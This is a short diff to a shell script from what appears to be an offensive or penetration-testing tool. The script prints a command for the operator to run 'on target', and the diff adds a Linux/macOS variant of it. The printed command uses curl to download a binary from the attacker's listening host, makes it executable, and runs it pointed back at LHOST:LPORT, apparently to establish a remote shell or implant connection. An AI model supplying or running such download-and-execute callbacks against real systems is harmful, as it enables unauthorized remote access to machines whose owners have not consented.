@@ -90,7 +90,11 @@ echo "[*] Copy/paste following command on target:"
 if [[ "$GITAR" ]]; then
 	echo "curl -O ${LHOST}:${WEBPORT}/pull/${BINARY} && chmod +x ${BINARY} && ./${BINARY} ${LHOST}:${LPORT}"
 else
-	echo "curl -O ${LHOST}:${WEBPORT}/${BINARY} && .\\${BINARY} ${LHOST}:${LPORT}"
+    if [[ "$WINDOWS" ]]; then
+        echo "curl -O ${LHOST}:${WEBPORT}/${BINARY} && .\\${BINARY} ${LHOST}:${LPORT}"
+    else
+        echo "curl -O ${LHOST}:${WEBPORT}/${BINARY} && chmod +x ${BINARY} && ./${BINARY} ${LHOST}:${LPORT}"
+    fi
 fi
 
 if [[ "$WINDOWS" ]]; then
